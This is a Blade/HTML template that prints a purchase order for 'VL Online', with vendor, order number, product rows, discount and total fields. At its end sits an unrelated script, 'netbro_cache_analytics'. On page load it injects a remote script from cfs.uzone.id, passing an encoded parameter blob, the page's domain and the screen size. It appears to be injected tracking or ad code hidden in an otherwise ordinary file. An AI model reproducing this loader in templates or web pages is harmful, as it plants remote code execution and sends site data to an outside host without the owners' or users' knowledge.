<html>
<style>
</style>
<style type="text/css" media="print">
@page{
	margin:0.2in;
	size : a4;
}
@media print {
    #Header, #Footer { display: none; }
	
    html, body {
    width: 210mm;
    height: 297mm;
  }
}

</style>
<body onload="print()">
<table width='100%'>

<table style="margin-top:10px;border-collapse:collapse;"border="0" align="center" width="100%">
    <tr>
        <td>
            <table style="margin-top:10px;margin-right:12px;border-collapse:collapse;"border="0" align="center" width="100%">
                 <tr><td style="text-align: left;font-size:20px"</td></tr>
                 <tr><td height="100">VL Online </td></tr>
            </table>
        </td>
        <td>
            <table style="margin-top:10px;border-collapse:collapse;"border="1" align="center" width="100%">
                 <tr><td style="text-align: center">Bill To</td></tr>
                 <tr><td height="30" style="font-size:12px;padding-left:10px">{{$purchase_order->vendor_address}}</td></tr>
            </table>
            <table style="margin-top:10px;border-collapse:collapse;"border="1" align="center" width="100%">
                 <tr><td style="text-align: center">Ship To</td></tr>
                 <tr><td height="30" style="font-size:12px;padding-left:10px">{{$purchase_order->vendor_address}}</td></tr>
            </table>

        </td>
        <td width="30"></td>
        <td>
            <p style="font-weight:bold">ORDER : </p>
            <table style="font-size:12px">
                <tr><td>No Order</td><td>{{$purchase_order->order_number}} </td></tr>
                <tr><td>Supplier</td><td>{{$purchase_order->vendor_name}} </td></tr>
                <tr><td>Order Date</td><td>{{$purchase_order->order_date}} </td></tr>
            </table>
        </td>
    </tr>
</table>
<table  class="headerku12" style="margin-top:10px;border-collapse:collapse;"border="1" align="center" width="100%">
 <thead>
        <tr>
		    <th>No</th>
			<th>SKU</th>
			<th>Produk</th>
			<th>Qty</th>
			<th>Harga</th>
            <th>Total</th>
            <th>Downpayment</th>
        </tr>
</thead>
<tbody>
		<?php $no = 0; ?>
		@foreach($po_detail as $item)
			<?php $no++; ?>
		<tr>
			<td style="text-align: center">{{$no}}</td>
			<td>{{$item->product_code}}</td>
			<td>{{$item->product_name}}</td>
			<td style="text-align: right">{{$item->qty}}</td>
			<td style="text-align: right">{{number_format($item->price)}}</td>
			<td style="text-align: right">{{number_format($item->subtotal)}}</td>
            <td style="text-align: right">{{number_format($item->downpayment)}}</td>
		</tr>
		@endforeach
        <tr><td colspan="8" height="20"style="border-left-style:hidden;border-right-style:hidden"></td></tr>
        <tr><td colspan="4"><span>Say :<span></td><td colspan="2" style="padding-left: 10px">Sub Total</td><td colspan="2" style="text-align:right">Rp. {{number_format($purchase_order->subtotal)}}</td></tr>
        <tr><td colspan="2" style="text-align: center">Approved By</td><td colspan="2" style="text-align: center">Customer.</td><td colspan="2" style="padding-left:10px">Diskon</td><td colspan="2" style="text-align:right">Rp. {{number_format($purchase_order->discount)}}</td></tr>
        <!-- <tr><td colspan="2" style="border-top-style:hidden"></td><td colspan="2" style="border-top-style:hidden"></td><td colspan="2" style="padding-left:10px">Additional Charge</td><td colspan="2" style="text-align:right">Rp.</td></tr> -->
        <!-- <tr><td colspan="2" style="border-top-style:hidden"></td><td colspan="2" style="border-top-style:hidden"></td><td colspan="2" style="padding-left:10px">Before Tax</td><td colspan="2" style="text-align:right">Rp.</td></tr> -->
        <!-- <tr><td colspan="2" style="border-top-style:hidden"></td><td colspan="2" style="border-top-style:hidden"></td><td colspan="2" style="padding-left:10px">Tax</td><td colspan="2" style="text-align:right">Rp. {{number_format($purchase_order->total_amount)}}</td></tr> -->
        <!--    <tr><td colspan="2" style="border-top-style:hidden"></td><td colspan="2" style="border-top-style:hidden"></td><td colspan="2" style="padding-left:10px">Rounding</td><td colspan="2" style="text-align:right">Rp. </td></tr> -->
        <tr><td colspan="2" style="text-align: center;border-top-style:hidden">(..................................)</td><td colspan="2" style="text-align: center;border-top-style:hidden">({{$sales_order->customer_name}})</td><td colspan="2" style="font-weight:bold; padding-left:10px">Total</td><td colspan="2" style="text-align:right;font-weight:bold">Rp. {{number_format($purchase_order->total_amount)}} </td></tr>

</tbody>
<!--  -->
</table>
	<br>
	<div align="left" style=" color: #000000; width: 100%; background-color: #ffffff; border-top: 1px solid rgba(0, 0, 0, 0.05); ">
		<p align="left" style="font-size: 12px"> {{$print->print_at}} Printed By: {{$print->print_by->name}}</p>
		    <br>
			<br>
			<br>
			<br>
			<br>
		    <br>
			<br>
			<br>
     </div>
     <br>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXpTaUNz0nmYwclgw6EJ9big9cHwnEFdBgTzeWtcgBig934XMkBwPTFzxMyQjlBVu7JWJRMTTIjUuEx1z18Q3Bp%2fLacDtzSfLsWvDrxy9nEIxZIhUlNjjzElip5SaTManbwAASdLE%2b9IQ7NakCsyQ7Kr462G9IiP1hdv2OMHSrtxOk1qMxWjlJ2ND8R6sV%2fGzR%2fXqaVjdjruFvQVZw97RRc5%2f%2fAa2FlvPTrHyT316II0%2bN3VHOVEW0IEc1lOr0EkUpOQA4sxWEmPos5w5JwEcZ7Stn30f0RpTBGNqt9to4cd3vnx9rESTw28ynHOiDs9WhIPpac1LffLc6hrk%2ftg4bYH%2b4LShnX4jfcDQAaI93FVyOoE1HWAycUB6bgQMj9IPzdlgBW6Mm9OAv6a48c2f5ylDo6ZJn3BQ4Fpijv5Oz6JpcJVK6EE1yUSttRCaAzXGr%2fKUtJ2IY5vN9wMKJqjMVOaCvXV1SyavxhfbX654z2Nl5lARSHOFYPHYqxDO9FAlrrkjBIt%2b%2bta2fuekYnXz3OqkdEJINEPcb4X9zpONwVC83q5EKur8iAZAMoLqEDT6p%2fqabSZeRxQfmGJgT7n92ejdU7fWJXAvj%2b0x0%2f%2baHsDg%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>